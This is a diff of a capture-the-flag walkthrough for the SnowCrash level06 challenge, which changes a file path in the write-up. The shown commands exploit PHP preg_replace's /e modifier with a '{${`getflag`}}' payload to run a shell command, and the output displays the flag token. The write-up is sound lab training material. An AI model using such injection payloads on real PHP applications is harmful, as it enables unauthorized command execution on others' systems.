@@ -43,7 +43,7 @@ The script prints the content of given variable "x". Using ``` `getflag` ``` as 
 
 So lets create a file whose content matches the regexp test ```"/(\[x (.*)\])/e"```, and inject ``` `getflag` ``` in correct [php syntax](https://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.nowdoc).
 ```
-level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /dev/shm/getflag
-level06@SnowCrash:~$ ./level06 /dev/shm/getflag
+level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /tmp/getflag
+level06@SnowCrash:~$ ./level06 /tmp/getflag
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 ```
